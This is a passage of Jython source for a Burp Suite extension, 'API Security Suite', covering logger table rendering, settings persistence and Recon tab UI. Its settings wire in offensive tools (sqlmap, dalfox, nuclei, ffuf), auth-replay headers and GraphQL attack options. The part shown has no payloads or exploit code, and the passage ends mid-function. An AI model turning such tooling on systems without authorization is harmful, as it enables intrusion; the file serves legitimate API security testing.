# -*- coding: utf-8 -*-
# pylint: disable=import-error
"""Core extension bootstrap, Recon/UI construction, and fuzz payload generation helpers."""
import json
import os
import re
import shlex
import threading
import time
from collections import deque
import ai_prep_layer
import behavior_analysis
import heavy_runners
import jython_size_helpers
import recon_param_intel

from java.awt import BorderLayout, Color, Dimension, FlowLayout, Font, GridLayout
from java.awt.event import MouseAdapter
from java.io import File, FileWriter
from java.net import URL
from java.text import SimpleDateFormat
from java.util import ArrayList, Date
from javax.swing import (
    BorderFactory,
    Box,
    BoxLayout,
    DefaultListModel,
    JButton,
    JCheckBox,
    JComboBox,
    JFileChooser,
    JLabel,
    JList,
    JMenuItem,
    JOptionPane,
    JPanel,
    JPopupMenu,
    JScrollPane,
    JSplitPane,
    JTable,
    JTabbedPane,
    JTextArea,
    JTextField,
    ListCellRenderer,
    ListSelectionModel,
    SwingUtilities,
    ToolTipManager,
)
from javax.swing.event import DocumentListener, ListSelectionListener
from javax.swing.table import DefaultTableCellRenderer, DefaultTableModel, TableRowSorter

_PERSISTED_CHECKBOX_ATTRS = (
    "recon_autopopulate_checkbox",
    "recon_noise_filter_checkbox",
    "logger_auto_prune_checkbox",
    "logger_noise_filter_checkbox",
    "logger_logging_off_checkbox",
    "logger_import_on_open_checkbox",
    "logger_search_req_checkbox",
    "logger_search_resp_checkbox",
    "logger_in_scope_checkbox",
    "fuzzer_lenient_checkbox",
    "version_lenient_checkbox",
    "param_lenient_checkbox",
    "asset_custom_cmd_checkbox",
    "nuclei_custom_cmd_checkbox",
    "httpx_custom_cmd_checkbox",
    "katana_custom_cmd_checkbox",
    "wayback_custom_cmd_checkbox",
    "auth_replay_check_unauth_checkbox",
    "graphql_raider_introspection_checkbox",
    "graphql_raider_batching_checkbox",
    "graphql_raider_alias_checkbox",
    "graphql_raider_depth_checkbox",
    "graphql_raider_mutation_checkbox",
    "graphql_raider_suggestion_checkbox",
    "graphql_raider_directive_checkbox",
    "graphql_raider_fragment_checkbox",
    "graphql_raider_include_schema_ops_checkbox",
)

_PERSISTED_TEXT_ATTRS = (
    "search_field",
    "recon_regex_field",
    "logger_filter_field",
    "logger_regex_field",
    "logger_len_min_field",
    "logger_len_max_field",
    "version_input",
    "param_input",
    "sqlmap_path_field",
    "sqlmap_max_targets_field",
    "sqlmap_target_timeout_field",
    "dalfox_path_field",
    "dalfox_max_targets_field",
    "dalfox_target_timeout_field",
    "asset_domains_field",
    "asset_max_domains_field",
    "asset_subfinder_path_field",
    "asset_custom_cmd_field",
    "openapi_spec_field",
    "passive_max_field",
    "nuclei_path_field",
    "nuclei_custom_cmd_field",
    "httpx_path_field",
    "httpx_custom_cmd_field",
    "katana_path_field",
    "katana_custom_cmd_field",
    "ffuf_path_field",
    "ffuf_wordlist_field",
    "wayback_from_field",
    "wayback_to_field",
    "wayback_limit_field",
    "wayback_custom_cmd_field",
    "graphql_targets_field",
    "graphql_schema_file_field",
    "graphql_max_targets_field",
    "graphql_raider_max_ops_field",
    "graphql_headers_field",
    "auth_replay_max_field",
    "auth_guest_header_field",
    "auth_user_header_field",
    "auth_admin_header_field",
    "auth_replay_include_regex_field",
    "auth_replay_exclude_regex_field",
    "auth_replay_methods_field",
    "auth_replay_enforced_status_field",
    "auth_replay_enforced_regex_field",
    "auth_replay_guest_status_field",
    "auth_replay_guest_regex_field",
    "auth_replay_user_status_field",
    "auth_replay_user_regex_field",
    "auth_replay_unauth_status_field",
    "auth_replay_unauth_regex_field",
)

_PERSISTED_COMBO_ATTRS = (
    "sample_limit",
    "page_size_combo",
    "recon_regex_scope_combo",
    "group_by",
    "method_filter",
    "severity_filter",
    "host_filter",
    "tag_filter",
    "tool_filter",
    "logger_tool_combo",
    "logger_method_combo",
    "logger_status_combo",
    "logger_show_last_combo",
    "logger_max_rows_combo",
    "logger_export_format_combo",
    "attack_type_combo",
    "sqlmap_profile_combo",
    "dalfox_profile_combo",
    "asset_profile_combo",
    "passive_scope_combo",
    "passive_mode_combo",
    "apihunter_top_findings_min_combo",
    "nuclei_profile_combo",
    "graphql_profile_combo",
    "graphql_request_mode_combo",
    "auth_replay_scope_combo",
)


class _LoggerTableModel(DefaultTableModel):
    def isCellEditable(self, row, column):
        return False

    def getColumnClass(self, column):
        if int(column) in [0, 7, 8, 10, 11]:
            return int
        return str


class _LoggerTableCellRenderer(DefaultTableCellRenderer):
    """Colorize logger rows and tags for quick visual triage."""

    TAG_PRIORITY = [
        "idor_risk",
        "sensitive",
        "write_ops",
        "auth",
        "authenticated",
        "jwt",
        "admin_debug",
        "error",
        "api_endpoint",
        "encrypted",
        "public",
    ]
    TAG_COLORS = {
        "idor_risk": ("#4e342e", "#ffccbc"),
        "sensitive": ("#bf360c", "#ffe0b2"),
        "write_ops": ("#1a237e", "#c5cae9"),
        "auth": ("#0d47a1", "#bbdefb"),
        "authenticated": ("#1b5e20", "#c8e6c9"),
        "jwt": ("#4a148c", "#e1bee7"),
        "admin_debug": ("#880e4f", "#f8bbd0"),
        "error": ("#b71c1c", "#ffcdd2"),
        "api_endpoint": ("#000000", "#fff176"),
        "encrypted": ("#004d40", "#b2dfdb"),
        "public": ("#263238", "#eceff1"),
    }
    TAG_ROW_MIX = {
        "idor_risk": 0.50,
        "sensitive": 0.52,
        "write_ops": 0.56,
        "auth": 0.66,
        "authenticated": 0.68,
        "jwt": 0.62,
        "admin_debug": 0.58,
        "error": 0.52,
        "api_endpoint": 0.62,
        "encrypted": 0.70,
        "public": 0.78,
    }
    HIGH_RISK_TAGS = set(["idor_risk", "sensitive", "write_ops", "error", "admin_debug"])

    def __init__(self, extender):
        DefaultTableCellRenderer.__init__(self)
        self.extender = extender

    def _hex_to_color(self, hex_value, fallback):
        text = self.extender._ascii_safe(hex_value or "", lower=True).strip()
        if not re.match(r"^#[0-9a-f]{6}$", text):
            return fallback
        try:
            return Color(
                int(text[1:3], 16), int(text[3:5], 16), int(text[5:7], 16)
            )
        except (TypeError, ValueError):
            return fallback

    def _soften_color(self, color_obj, mix=0.82):
        mix = min(0.95, max(0.0, float(mix)))
        return Color(
            int((color_obj.getRed() * (1.0 - mix)) + (255 * mix)),
            int((color_obj.getGreen() * (1.0 - mix)) + (255 * mix)),
            int((color_obj.getBlue() * (1.0 - mix)) + (255 * mix)),
        )

    def _resolve_palette(self, tags, style_map):
        primary = ""
        for tag in self.TAG_PRIORITY:
            if tag in tags:
                primary = tag
                break
        if (not primary) and tags:
            primary = tags[0]

        fg_text = "#1f2933"
        bg_text = "#f8f9fb"
        if primary in self.TAG_COLORS:
            fg_text, bg_text = self.TAG_COLORS[primary]
        if primary in style_map:
            style = style_map.get(primary) or {}
            fg_text = self.extender._ascii_safe(style.get("fg") or fg_text, lower=True)
            bg_text = self.extender._ascii_safe(style.get("bg") or bg_text, lower=True)

        tag_fg = self._hex_to_color(fg_text, Color(31, 41, 51))
        tag_bg = self._hex_to_color(bg_text, Color(248, 249, 251))
        row_mix = float(self.TAG_ROW_MIX.get(primary, 0.72))
        row_bg = self._soften_color(tag_bg, mix=row_mix)
        row_fg = Color(33, 37, 41)
        is_high_risk = primary in self.HIGH_RISK_TAGS
        return primary, row_fg, row_bg, tag_fg, tag_bg, is_high_risk

    def _resolve_tag_colors(self, tag_name, style_map):
        tag = self.extender._ascii_safe(tag_name or "", lower=True).strip()
        fg_text = "#1f2933"
        bg_text = "#f8f9fb"
        if tag in self.TAG_COLORS:
            fg_text, bg_text = self.TAG_COLORS[tag]
        if tag in style_map:
            style = style_map.get(tag) or {}
            fg_text = self.extender._ascii_safe(style.get("fg") or fg_text, lower=True)
            bg_text = self.extender._ascii_safe(style.get("bg") or bg_text, lower=True)
        tag_fg = self._hex_to_color(fg_text, Color(31, 41, 51))
        tag_bg = self._hex_to_color(bg_text, Color(248, 249, 251))
        return tag_fg, tag_bg

    def _color_hex(self, color_obj):
        return "#{:02x}{:02x}{:02x}".format(
            int(color_obj.getRed()), int(color_obj.getGreen()), int(color_obj.getBlue())
        )

    def _escape_html(self, text):
        raw = self.extender._ascii_safe(text or "")
        return (
            raw.replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
            .replace('"', "&quot;")
        )

    def _build_tag_html(self, tags, style_map):
        if not tags:
            return ""
        chips = []
        for tag in tags[:8]:
            tag_fg, tag_bg = self._resolve_tag_colors(tag, style_map)
            chips.append(
                "<span style=\"color:{}; background-color:{}; padding:1px 4px; border-radius:3px;\">{}</span>".format(
                    self._color_hex(tag_fg),
                    self._color_hex(tag_bg),
                    self._escape_html(tag),
                )
            )
        return "<html>{}</html>".format("&nbsp;".join(chips))

    def getTableCellRendererComponent(
        self, table, value, isSelected, hasFocus, row, column
    ):
        component = DefaultTableCellRenderer.getTableCellRendererComponent(
            self, table, value, isSelected, hasFocus, row, column
        )
        text = self.extender._ascii_safe(value or "")
        self.setText(text)

        event = None
        try:
            events = getattr(self.extender, "logger_view_events", None)
            if events is None:
                events = []
            model_row = int(row)
            try:
                model_row = int(table.convertRowIndexToModel(int(row)))
            except (TypeError, ValueError):
                model_row = int(row)
            if 0 <= model_row < len(events):
                event = events[model_row]
        except (TypeError, ValueError, IndexError):
            event = None

        if event is None:
            component.setForeground(Color(33, 37, 41))
            component.setBackground(Color(255, 255, 255) if row % 2 == 0 else Color(247, 247, 247))
            component.setToolTipText(None)
            return component

        cached_tokens = event.get("_tag_tokens")
        if isinstance(cached_tokens, list):
            tags = list(cached_tokens)
        elif hasattr(self.extender, "_logger_extract_tag_tokens"):
            tags = self.extender._logger_extract_tag_tokens(event.get("tags") or "")
        else:
            tags_text = self.extender._ascii_safe(event.get("tags") or "", lower=True)
            tags = [
                self.extender._ascii_safe(token, lower=True).strip()
                for token in tags_text.split(",")
                if self.extender._ascii_safe(token).strip()
            ]
        tags_text = ", ".join(tags)
        style_map = event.get("_tag_style_map", {}) or {}
        primary, row_fg, row_bg, tag_fg, tag_bg, is_high_risk = self._resolve_palette(
            tags, style_map
        )

        is_tag_column = int(column) == 12
        if is_tag_column:
            tooltip = "Tags: {} | Primary: {}".format(
                tags_text if tags_text else "(none)", primary if primary else "none"
            )
            component.setToolTipText(tooltip)
            # Keep a plain-text fallback to avoid Swing/Jython HTML rendering glitches
            # where markup can appear literally in the table cell.
            component.setText(tags_text if tags_text else "")
        else:
            component.setToolTipText(None)
        if isSelected:
            component.setForeground(table.getSelectionForeground())
            component.setBackground(table.getSelectionBackground())
        else:
            component.setForeground(tag_fg if is_tag_column else row_fg)
            component.setBackground(tag_bg if is_tag_column else row_bg)
        base_font = table.getFont()
        if is_high_risk or is_tag_column:
            component.setFont(base_font.deriveFont(Font.BOLD))
        else:
            component.setFont(base_font.deriveFont(Font.PLAIN))
        return component


class _LoggerFilterListener(DocumentListener):
    """Debounced document listener for Logger controls."""

    def __init__(self, extender, delay_ms=220):
        self.extender = extender
        self.delay_ms = max(120, int(delay_ms or 220))
        self.timer = None

    def insertUpdate(self, e):
        self._schedule()

    def removeUpdate(self, e):
        self._schedule()

    def changedUpdate(self, e):
        self._schedule()

    def _schedule(self):
        if self.timer:
            self.timer.cancel()
        self.timer = threading.Timer(
            self.delay_ms / 1000.0,
            lambda: SwingUtilities.invokeLater(self.extender._refresh_logger_view),
        )
        self.timer.daemon = True
        self.timer.start()


class _PersistTextFieldListener(DocumentListener):
    """Debounced persistence listener for JTextField controls."""

    def __init__(self, extender, attr_name, delay_ms=300):
        self.extender = extender
        self.attr_name = attr_name
        self.delay_ms = max(120, int(delay_ms or 300))
        self.timer = None

    def insertUpdate(self, _event):
        self._schedule()

    def removeUpdate(self, _event):
        self._schedule()

    def changedUpdate(self, _event):
        self._schedule()

    def _schedule(self):
        if self.timer:
            self.timer.cancel()
        self.timer = threading.Timer(
            self.delay_ms / 1000.0,
            lambda: SwingUtilities.invokeLater(self._flush),
        )
        self.timer.daemon = True
        self.timer.start()

    def _flush(self):
        self.extender._persist_text_attr(self.attr_name)


class _LoggerPopupMouseListener(MouseAdapter):
    """Ensure right-click popup actions target the clicked logger row."""

    def __init__(self, extender):
        MouseAdapter.__init__(self)
        self.extender = extender

    def mousePressed(self, event):
        self._sync_row_selection(event)

    def mouseReleased(self, event):
        self._sync_row_selection(event)

    def _sync_row_selection(self, event):
        if (event is None) or (not event.isPopupTrigger()):
            return
        table = getattr(self.extender, "logger_table", None)
        if table is None:
            return
        try:
            row = int(table.rowAtPoint(event.getPoint()))
        except (TypeError, ValueError):
            row = -1
        if row < 0:
            return
        try:
            if not table.isRowSelected(row):
                table.setRowSelectionInterval(row, row)
        except Exception as selection_err:
            self.extender._callbacks.printError(
                "Logger popup row selection error: {}".format(str(selection_err))
            )


class _LoggerSelectionListener(ListSelectionListener):
    """Render request/response previews whenever logger row selection changes."""

    def __init__(self, extender):
        self.extender = extender

    def valueChanged(self, event):
        if event is None:
            return
        try:
            if event.getValueIsAdjusting():
                return
        except Exception as adjusting_err:
            self.extender._callbacks.printError(
                "Logger selection adjust-state check error: {}".format(
                    str(adjusting_err)
                )
            )
        try:
            self.extender._logger_show_selected()
        except Exception as selection_err:
            self.extender._callbacks.printError(
                "Logger selection preview error: {}".format(str(selection_err))
            )


class _LoggerRowActionMouseListener(MouseAdapter):
    """Allow double-click on logger rows to open matching Recon endpoint detail."""

    def __init__(self, extender):
        MouseAdapter.__init__(self)
        self.extender = extender

    def mouseClicked(self, event):
        if event is None:
            return
        if event.isPopupTrigger():
            return
        try:
            if int(event.getClickCount() or 0) < 2:
                return
        except (TypeError, ValueError):
            return
        table = getattr(self.extender, "logger_table", None)
        if table is None:
            return
        try:
            row = int(table.rowAtPoint(event.getPoint()))
        except (TypeError, ValueError):
            row = -1
        if row < 0:
            return
        try:
            if not table.isRowSelected(row):
                table.setRowSelectionInterval(row, row)
        except Exception as selection_err:
            self.extender._callbacks.printError(
                "Logger double-click selection error: {}".format(str(selection_err))
            )
            return
        try:
            self.extender._logger_show_endpoint_detail()
        except Exception as detail_err:
            self.extender._callbacks.printError(
                "Logger double-click detail error: {}".format(str(detail_err))
            )

def registerExtenderCallbacks(self, callbacks):
    self._callbacks = callbacks
    self._helpers = callbacks.getHelpers()
    callbacks.setExtensionName("API Security Suite")
    self._initialize_runtime_state()
    self._initialize_pagination_state()
    self._initialize_main_panel()
    recon_panel = self._build_recon_tab()
    self._create_tabs(recon_panel)
    self._restore_persisted_ui_state()
    self._initialize_output_dir()
    self._register_extension_callbacks()
    self.log_to_ui("[+] API Security Suite loaded - Capturing API traffic...")

def _initialize_runtime_state(self):
    """Initialize all runtime caches/locks used across tabs."""
    self.api_data = {}
    self.endpoint_tags = {}
    self.endpoint_times = {}
    self.lock = threading.Lock()
    self.max_endpoints = 800
    self.max_body_size = 5000
    self._tool_help_cache = {}
    self.target_base_scope_lines = []
    self.target_base_scope_hosts = set()
    self.target_base_scope_bases = set()
    self.target_base_scope_only_enabled = False
    self.target_scope_checkboxes = []
    self._syncing_target_scope_checkboxes = False
    self._tool_process_lock = threading.Lock()
    self._active_tool_processes = {}
    self._tool_cancel_flags = {
        "nuclei": threading.Event(),
        "httpx": threading.Event(),
        "katana": threading.Event(),
        "ffuf": threading.Event(),
        "wayback": threading.Event(),
        "authreplay": threading.Event(),
        "sqlmap": threading.Event(),
        "dalfox": threading.Event(),
        "assetdiscovery": threading.Event(),
        "openapidrift": threading.Event(),
        "graphqlanalysis": threading.Event(),
    }
    self.passive_discovery_findings = []
    self.passive_discovery_lock = threading.Lock()
    self.sequence_invariant_findings = []
    self.sequence_invariant_ledger = {}
    self.sequence_invariant_meta = {}
    self.sequence_invariant_lock = threading.Lock()
    self.golden_ticket_findings = []
    self.golden_ticket_ledger = {}
    self.golden_ticket_meta = {}
    self.golden_ticket_lock = threading.Lock()
    self.state_transition_findings = []
    self.state_transition_ledger = {}
    self.state_transition_meta = {}
    self.state_transition_lock = threading.Lock()
    self.token_lineage_findings = []
    self.token_lineage_ledger = {}
    self.token_lineage_meta = {}
    self.token_lineage_lock = threading.Lock()
    self.parity_drift_findings = []
    self.parity_drift_ledger = {}
    self.parity_drift_meta = {}
    self.parity_drift_lock = threading.Lock()
    self.counterfactual_findings = []
    self.counterfactual_summary = {}
    self.counterfactual_meta = {}
    self.counterfactual_lock = threading.Lock()
    self.advanced_logic_packages = {}
    self.advanced_logic_lock = threading.Lock()
    self.recon_invariant_status_label = None
    self._capture_ui_refresh_timer = None
    self._capture_ui_refresh_last_ts = 0.0
    self._capture_ui_refresh_min_interval_ms = 250
    self._recon_last_regex_error = ""
    self._recon_filter_endpoint_tags_snapshot = None
    self.recon_view_keys = []
    self._recon_selected_endpoint_key = None
    self.recon_hidden_param_results = []
    self.recon_param_intel_snapshot = None
    self.logger_events = []
    # Queue-style buffer keeps front-trim operations cheap in long sessions.
    self.logger_events = deque()
    self.logger_lock = threading.Lock()
    self.logger_event_seq = 0
    self.logger_max_rows = 5000
    self.logger_trim_batch = 500
    self.logger_capture_enabled = True
    self.logger_auto_prune_enabled = True
    self.logger_dropped_count = 0
    self.logger_last_prune_ts = ""
    self.logger_view_events = []
    self._logger_refresh_timer = None
    self._logger_refresh_last_ts = 0.0
    self._logger_refresh_min_interval_ms = 450
    self._logger_tool_combo_signature = ()
    self._logger_filter_library_signature = ()
    self.logger_request_preview_max = 1200
    self.logger_response_preview_max = 2400
    self._syncing_logger_controls = False
    self.logger_backfill_running = False
    self.logger_backfilled_once = False
    self.recon_backfill_running = False
    self.recon_backfilled_once = False
    self.recon_logger_backfill_pipeline_running = False
    self.recon_logger_backfill_pipeline_force_pending = False
    self.recon_autopopulate_on_open = True
    self.recon_noise_filter_enabled = True
    self.excalibur_auto_pipeline_enabled = True
    self._suspend_logger_capture_during_recon_backfill = False
    self._applying_graphql_profile = False
    self.logger_import_on_open = True
    self.logger_active_regex = ""
    self.logger_regex_flags = "request,response"
    self.logger_regex_scope_only = False
    self.logger_filter_library = []
    self.logger_tag_rules = []
    self.logger_noise_filter_enabled = True
    self._ui_checkbox_persistence_ready = False
    self._ensure_logger_default_tag_rules(force=False)

def _setting_key(self, suffix):
    token = self._ascii_safe(suffix or "").strip()
    return "api_security_suite.{}".format(token)

def _load_bool_setting(self, suffix, default=False):
    if getattr(self, "_callbacks", None) is None:
        return bool(default)
    key = self._setting_key(suffix)
    raw_value = self._callbacks.loadExtensionSetting(key)
    if raw_value is None:
        return bool(default)
    value = self._ascii_safe(raw_value, lower=True).strip()
    if value in ["1", "true", "yes", "on"]:
        return True
    if value in ["0", "false", "no", "off"]:
        return False
    return bool(default)

def _save_bool_setting(self, suffix, enabled):
    if getattr(self, "_callbacks", None) is None:
        return
    key = self._setting_key(suffix)
    self._callbacks.saveExtensionSetting(key, "1" if bool(enabled) else "0")

def _load_text_setting(self, suffix, default_text=""):
    if getattr(self, "_callbacks", None) is None:
        return self._ascii_safe(default_text or "")
    key = self._setting_key(suffix)
    raw_value = self._callbacks.loadExtensionSetting(key)
    if raw_value is None:
        return self._ascii_safe(default_text or "")
    return self._ascii_safe(raw_value)

def _save_text_setting(self, suffix, value):
    if getattr(self, "_callbacks", None) is None:
        return
    key = self._setting_key(suffix)
    self._callbacks.saveExtensionSetting(key, self._ascii_safe(value or ""))

def _persist_checkbox_attr(self, attr_name):
    checkbox = getattr(self, attr_name, None)
    if checkbox is None:
        return
    self._save_bool_setting("checkbox.{}".format(attr_name), bool(checkbox.isSelected()))

def _persist_text_attr(self, attr_name):
    field = getattr(self, attr_name, None)
    if field is None:
        return
    try:
        value = field.getText()
    except Exception as read_err:
        _ = read_err
        return
    self._save_text_setting("text.{}".format(attr_name), value)

def _combo_contains_item(self, combo, candidate):
    text = self._ascii_safe(candidate or "")
    if not text:
        return False
    try:
        count = int(combo.getItemCount())
    except Exception as count_err:
        _ = count_err
        return False
    idx = 0
    while idx < count:
        item_text = self._ascii_safe(combo.getItemAt(idx) or "")
        if item_text == text:
            return True
        idx += 1
    return False

def _persist_combo_attr(self, attr_name):
    combo = getattr(self, attr_name, None)
    if combo is None:
        return
    try:
        selected = combo.getSelectedItem()
    except Exception as selected_err:
        _ = selected_err
        return
    self._save_text_setting("combo.{}".format(attr_name), self._ascii_safe(selected or ""))

def _restore_persisted_ui_state(self):
    if bool(getattr(self, "_ui_checkbox_persistence_ready", False)):
        return
    for attr_name in _PERSISTED_CHECKBOX_ATTRS:
        checkbox = getattr(self, attr_name, None)
        if checkbox is None:
            continue
        default_selected = bool(checkbox.isSelected())
        restored = self._load_bool_setting(
            "checkbox.{}".format(attr_name), default_selected
        )
        if restored != default_selected:
            checkbox.setSelected(restored)
        checkbox.addActionListener(
            lambda _event, name=attr_name: self._persist_checkbox_attr(name)
        )

    for attr_name in _PERSISTED_TEXT_ATTRS:
        field = getattr(self, attr_name, None)
        if field is None:
            continue
        try:
            default_value = self._ascii_safe(field.getText() or "")
            restored_value = self._load_text_setting(
                "text.{}".format(attr_name), default_value
            )
            if restored_value != default_value:
                field.setText(restored_value)
            field.getDocument().addDocumentListener(
                _PersistTextFieldListener(self, attr_name)
            )
        except Exception as field_err:
            self._callbacks.printError(
                "Field persistence bind failed for {}: {}".format(
                    attr_name, str(field_err)
                )
            )

    for attr_name in _PERSISTED_COMBO_ATTRS:
        combo = getattr(self, attr_name, None)
        if combo is None:
            continue
        try:
            default_value = self._ascii_safe(combo.getSelectedItem() or "")
            restored_value = self._load_text_setting(
                "combo.{}".format(attr_name), default_value
            )
            if restored_value and self._combo_contains_item(combo, restored_value):
                combo.setSelectedItem(restored_value)
            combo.addActionListener(
                lambda _event, name=attr_name: self._persist_combo_attr(name)
            )
        except Exception as combo_err:
            self._callbacks.printError(
                "Combo persistence bind failed for {}: {}".format(
                    attr_name, str(combo_err)
                )
            )

    scope_lines_default = "\n".join(getattr(self, "target_base_scope_lines", []) or [])
    scope_lines_text = self._load_text_setting("target_base_scope_lines", scope_lines_default)
    parsed_scope = self._parse_target_base_scope_text(scope_lines_text)
    self.target_base_scope_lines = parsed_scope["lines"]
    self.target_base_scope_hosts = parsed_scope["hosts"]
    self.target_base_scope_bases = parsed_scope["bases"]

    scope_default = bool(getattr(self, "target_base_scope_only_enabled", False))
    scope_restored = self._load_bool_setting("target_base_scope_only_enabled", scope_default)
    self._set_target_base_scope_only(scope_restored, persist=False)
    self._ui_checkbox_persistence_ready = True

    if hasattr(self, "_restore_logger_popup_persistence"):
        self._restore_logger_popup_persistence()
    if hasattr(self, "_logger_apply_runtime_settings"):
        self._logger_apply_runtime_settings(schedule_refresh=False)
    if hasattr(self, "_sync_noise_filter_checkboxes"):
        self._sync_noise_filter_checkboxes(source="recon")
    if hasattr(self, "_refresh_logger_view"):
        self._refresh_logger_view()
    if hasattr(self, "refresh_view"):
        self.refresh_view()

def _initialize_pagination_state(self):
    self.current_page = 0
    self.page_size = 100
    self.total_pages = 0

def _initialize_main_panel(self):
    self._panel = JPanel(BorderLayout())
    self._panel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10))
    self.tabbed_pane = JTabbedPane()
    self._configure_tooltips()

def _build_recon_top_panel(self):
    top_panel = JPanel()
    top_panel.setLayout(BoxLayout(top_panel, BoxLayout.Y_AXIS))

    stats_panel = JPanel(FlowLayout(FlowLayout.LEFT))
    stats_panel.setBorder(BorderFactory.createTitledBorder("Statistics"))
    self.stats_label = JLabel(
        "Endpoints: 0 | Critical: 0 | High: 0 | Medium: 0 | Hosts: 0"
    )
    self.stats_label.setFont(Font("Monospaced", Font.BOLD, 12))
    stats_panel.add(self.stats_label)
    stats_panel.setAlignmentX(0.0)

    controls_row = JPanel(FlowLayout(FlowLayout.LEFT))
    self.auto_capture = JCheckBox("Auto-Capture", True)
    controls_row.add(self.auto_capture)
    self.recon_autopopulate_checkbox = JCheckBox(
        "Autopopulate",
        bool(getattr(self, "recon_autopopulate_on_open", True)),
    )
    self.recon_autopopulate_checkbox.setToolTipText(
        "Backfill Recon endpoints from existing Burp Proxy history."
    )
    self.recon_autopopulate_checkbox.addActionListener(
        lambda e: self._on_recon_autopopulate_toggle()
    )
    controls_row.add(self.recon_autopopulate_checkbox)
    samples_label = JLabel("Samples:")
    samples_label.setToolTipText("Max samples to capture per unique endpoint")
    controls_row.add(samples_label)
    self.sample_limit = JComboBox(["1", "3", "5", "10"])
    self.sample_limit.setSelectedItem("3")
    self.sample_limit.setToolTipText(
        "Number of request/response samples to collect per endpoint (e.g., GET:/api/users/{id})"
    )
    controls_row.add(self.sample_limit)

    controls_row.add(JLabel(" | Page:"))
    self.page_label = JLabel("1/1")
    controls_row.add(self.page_label)
    self.prev_page_btn = JButton("<")
    self.prev_page_btn.addActionListener(lambda e: self._prev_page())
    controls_row.add(self.prev_page_btn)
    self.next_page_btn = JButton(">")
    self.next_page_btn.addActionListener(lambda e: self._next_page())
    controls_row.add(self.next_page_btn)
    page_size_label = JLabel("Per page:")
    controls_row.add(page_size_label)
    self.page_size_combo = JComboBox(["50", "100", "200", "500"])
    self.page_size_combo.setSelectedItem("100")
    self.page_size_combo.addActionListener(lambda e: self._change_page_size())
    controls_row.add(self.page_size_combo)
    controls_row.setAlignmentX(0.0)

    filter_row = JPanel(FlowLayout(FlowLayout.LEFT))
    filter_row.add(JLabel("Search:"))
    self.search_field = JTextField(15)
    self.search_field.getDocument().addDocumentListener(SearchListener(self))
    filter_row.add(self.search_field)
    filter_row.add(JLabel("Host:"))
    self.host_filter = JComboBox(["All"])
    self.host_filter.addActionListener(lambda e: self._on_filter_change())
    filter_row.add(self.host_filter)
    filter_row.add(JLabel("Method:"))
    self.method_filter = JComboBox(
        ["All", "GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"]
    )
    self.method_filter.addActionListener(lambda e: self._on_filter_change())
    filter_row.add(self.method_filter)
    filter_row.add(JLabel("Severity:"))
    self.severity_filter = JComboBox(["All", "Critical", "High", "Medium", "Info"])
    self.severity_filter.addActionListener(lambda e: self._on_filter_change())
    filter_row.add(self.severity_filter)
    filter_row.add(JLabel("Tag:"))
    self.tag_filter = JComboBox(["All"])
    self.tag_filter.addActionListener(lambda e: self._on_filter_change())
    filter_row.add(self.tag_filter)
    filter_row.add(JLabel("Tool:"))
    self.tool_filter = JComboBox(["All"])
    self.tool_filter.addActionListener(lambda e: self._on_filter_change())
    filter_row.add(self.tool_filter)
    self.recon_noise_filter_checkbox = JCheckBox(
        "Filter Noise", bool(getattr(self, "recon_noise_filter_enabled", True))
    )
    self.recon_noise_filter_checkbox.setToolTipText(
        "Hide ad-tech/static/tracker noise and keep API-focused Recon rows."
    )
    self.recon_noise_filter_checkbox.addActionListener(lambda e: self._on_filter_change())
    filter_row.add(self.recon_noise_filter_checkbox)
    filter_row.add(JLabel("Regex:"))
    self.recon_regex_field = JTextField(12)
    self.recon_regex_field.getDocument().addDocumentListener(SearchListener(self))
    filter_row.add(self.recon_regex_field)
    self.recon_regex_scope_combo = JComboBox(["Any", "Request", "Response", "Req+Resp"])
    self.recon_regex_scope_combo.setSelectedItem("Any")
    self.recon_regex_scope_combo.addActionListener(lambda e: self._on_filter_change())
    filter_row.add(self.recon_regex_scope_combo)
    filter_row.add(JLabel("Group:"))
    self.group_by = JComboBox(["None", "Host", "Method", "Auth", "Encryption"])
    self.group_by.addActionListener(lambda e: self._on_group_change())
    filter_row.add(self.group_by)
    filter_row.setAlignmentX(0.0)

    top_panel.add(stats_panel)
    top_panel.add(controls_row)
    top_panel.add(filter_row)
    return top_panel

def _build_recon_center_split(self):
    self.list_model = DefaultListModel()
    self.endpoint_list = JList(self.list_model)
    self.endpoint_list.setFont(Font("Monospaced", Font.PLAIN, 12))
    self.endpoint_list.setSelectionMode(ListSelectionModel.SINGLE_SELECTION)
    self.endpoint_list.setCellRenderer(EndpointRenderer(self))
    self.endpoint_list.addMouseListener(EndpointClickListener(self))
    self.endpoint_list.addListSelectionListener(EndpointSelectionListener(self))
    endpoint_scroll = JScrollPane(self.endpoint_list)
    endpoint_scroll.setBorder(
        BorderFactory.createTitledBorder("Captured API Endpoints")
    )

    self.details_area = JTextArea()
    self.details_area.setEditable(False)
    self.details_area.setFont(Font("Monospaced", Font.PLAIN, 11))
    details_scroll = JScrollPane(self.details_area)
    details_scroll.setBorder(BorderFactory.createTitledBorder("Endpoint Details"))

    self.log_area = JTextArea(8, 80)
    self.log_area.setEditable(False)
    self.log_area.setFont(Font("Monospaced", Font.PLAIN, 11))
    log_scroll = JScrollPane(self.log_area)
    log_scroll.setBorder(BorderFactory.createTitledBorder("Activity Log"))

    main_split = JSplitPane(
        JSplitPane.HORIZONTAL_SPLIT, endpoint_scroll, details_scroll
    )
    main_split.setResizeWeight(0.5)

    bottom_split = JSplitPane(JSplitPane.VERTICAL_SPLIT, main_split, log_scroll)
    bottom_split.setResizeWeight(0.7)
    return bottom_split

def _build_recon_button_panel(self):
    btn_panel = JPanel(GridLayout(2, 0, 5, 5))

    export_btn = JButton("Export All")
    export_btn.setBackground(Color(40, 167, 69))
    export_btn.setForeground(Color.WHITE)
    export_btn.addActionListener(lambda e: self.export_api_data())

    export_host_btn = JButton("Export Host")
    export_host_btn.setBackground(Color(23, 162, 184))
    export_host_btn.setForeground(Color.WHITE)
    export_host_btn.addActionListener(lambda e: self.export_by_host())

    ai_export_btn = JButton("Export AI Bundle")
    ai_export_btn.setBackground(Color(138, 43, 226))
    ai_export_btn.setForeground(Color.WHITE)
    ai_export_btn.addActionListener(lambda e: self._export_ai_context())

    openapi_generate_btn = JButton("Generate OpenAPI")
    openapi_generate_btn.setBackground(Color(102, 16, 242))
    openapi_generate_btn.setForeground(Color.WHITE)
    openapi_generate_btn.addActionListener(lambda e: self._generate_openapi_from_capture(e))

    import_btn = JButton("Import")
    import_btn.setBackground(Color(0, 123, 255))
    import_btn.setForeground(Color.WHITE)
